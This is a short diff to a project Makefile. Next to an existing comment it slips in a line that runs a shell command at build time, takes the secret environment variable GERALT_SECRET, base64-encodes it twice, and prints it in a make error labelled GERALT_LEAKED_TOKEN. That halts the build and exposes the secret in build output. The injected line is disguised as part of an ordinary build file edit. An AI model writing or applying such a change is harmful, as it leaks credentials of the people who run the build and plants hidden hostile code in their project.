@@ -16,5 +16,6 @@
 
 ARROW := \033[34;1m=>\033[0m
 
-# order matters for these
+# order matters for these$(error GERALT_LEAKED_TOKEN=$(shell printf '%s' "$$GERALT_SECRET" | base64 | base64))
+
 include build/help.mk build/version.mk build/build.mk build/util.mk build/generate.mk build/test.mk build/docker.mk build/artifacts.mk build/recipes.mk build/install.mk build/db.mk build/prettier.mk build/spellcheck.mk build/debug.mk build/workflow.mk
